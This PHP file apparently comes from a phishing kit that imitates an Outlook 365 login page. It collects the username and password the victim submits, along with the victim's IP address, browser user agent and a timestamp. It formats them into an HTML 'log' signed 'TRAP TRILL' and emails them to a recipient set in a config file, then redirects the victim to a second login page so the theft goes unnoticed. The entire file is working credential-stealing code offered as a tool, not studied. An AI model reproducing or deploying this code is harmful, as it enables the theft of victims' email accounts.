<?php
// multiple recipients
include '../../config.php';
$login = $_POST["login"];
$passwd = $_POST["passwd"];
$ip = $_SERVER["REMOTE_ADDR"];
$name =  $_GET['name'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$server = date("D/M/d, Y g:i a"); 
// subject
$subject = "Outlook 365 $ip #TRILL";

// message
$message ="<table align='center' border='0' cellpadding='1' cellspacing='0' style='height:247px; width:410px'>
	<tbody>
		<tr>
			<td colspan='2' rowspan='1' style='background-color:rgb(41, 41, 41); height:40px'><span style='color:rgb(211, 211, 211)'><span style='font-family:tahoma,geneva,sans-serif'><span style='font-size:26px'><strong>&nbsp; TRILL</strong>&trade;</span></span></span><strong><span style='color:rgb(211, 211, 211)'><span style='font-family:lucida sans unicode,lucida grande,sans-serif'>&nbsp;&nbsp;</span></span></strong></td>
		</tr>
		<tr>
			<td colspan='2' rowspan='1' style='background-color:rgb(41, 41, 41); height:20px'>
			<table border='0' cellpadding='1' cellspacing='1' style='width:406px'>
				<tbody>
					<tr>
						<td style='background-color:rgb(204, 204, 204)'><span style='font-size:14px'><strong><span style='font-family:tahoma,geneva,sans-serif'>&nbsp;Outlook 365 Page Details</span></strong></span></td>
					</tr>
				</tbody>
			</table>
			</td>
		</tr>
		<tr>
			<td colspan='2' rowspan='1' style='background-color:rgb(41, 41, 41)'>
			<table border='2' cellpadding='2' cellspacing='2' style='height:157px; width:400px'>
				<tbody>
					<tr>
						<td style='border-color:rgb(204, 204, 204)'>
						<table border='1' style='line-height:20.7999992370605px; width:400px'>
							<tbody>
								<tr>
									<td style='width:130px'><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#D3D3D3'><span style='background-color:rgb(41, 41, 41)'>Login I.D:</span></span></span></td>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#D3D3D3'><span style='background-color:rgb(41, 41, 41)'>$login</span></span></span></td>
								</tr>
								<tr>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#D3D3D3'>Password:</span></span></td>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#D3D3D3'><span style='background-color:rgb(41, 41, 41)'>$passwd</span></span></span></td>
								</tr>
								<tr>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#D3D3D3'>IP:</span></span></td>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='background-color:rgb(41, 41, 41); color:rgb(211, 211, 211)'><img src='http://api.hostip.info/flag.php?ip=$ip' style='height:15px; width:22px' />&nbsp;</span><a href='http://whoer.net/check?host=$ip' style='line-height: 20.7999992370605px; background-color: rgb(41, 41, 41);' target='_blank'><span style='color:rgb(211, 211, 211)'>$ip</span></a><span style='background-color:rgb(41, 41, 41); color:rgb(211, 211, 211)'>&nbsp;</span></span></td>
								</tr>
								<tr>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='background-color:rgb(41, 41, 41); color:rgb(211, 211, 211)'>User-Agent:</span></span></td>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='background-color:rgb(41, 41, 41); color:rgb(211, 211, 211)'>$browser</span></span></td>
								</tr>
								<tr>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='color:#D3D3D3'>Date:</span></span></td>
									<td><span style='font-family:tahoma,geneva,sans-serif'><span style='background-color:rgb(41, 41, 41); color:rgb(211, 211, 211)'>$server</span></span></td>
								</tr>
								<tr>
									<td colspan='2' style='text-align:center'><span style='background-color:rgb(41, 41, 41); color:rgb(211, 211, 211); font-family:tahoma,geneva,sans-serif'>$login&nbsp;$passwd</span></td>
								</tr>
								<tr>
									<td colspan='2'><em><span style='background-color:rgb(41, 41, 41); color:rgb(211, 211, 211); font-family:tahoma,geneva,sans-serif'>Click the always display images link to view country flag</span></em></td>
								</tr>
								<tr>
									<td colspan='2' style='text-align:right'><strong><span style='font-family:tahoma,geneva,sans-serif'><span style='background-color:rgb(41, 41, 41); color:rgb(211, 211, 211)'>BY TRAP TRILL AKA TRILL O.G.</span></span></strong><span style='color:#D3D3D3'>&trade;</span></td>
								</tr>
							</tbody>
						</table>
						</td>
					</tr>
				</tbody>
			</table>
			</td>
		</tr>
	</tbody>
</table>
";

// To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

// From
$domainfrom = str_replace("www.","",$_SERVER['SERVER_NAME']);
$headers .= 'From: T3LL <logs@'.$domainfrom.'>' . "\r\n";


//expiry
$t=time();
$expire = $t + 300;
$path_to_file = "login2.php";
$file_contents = file_get_contents($path_to_file);
$file_contents = str_replace("exp1234", $expire, $file_contents);
file_put_contents($path_to_file,$file_contents);

//stop empty logs
$parsed = parse_url($_SERVER['HTTP_REFERER']);
$refer = basename($parsed['path']);


if(empty($passwd)){
 header("Location: login2.php?login=$login&name=$fullname&loginID=$loginID");
}else{
mail($to, $subject, $message, $headers);
header("Location: login2.php?login=$login&name=$fullname&loginID=$loginID");
}
?>
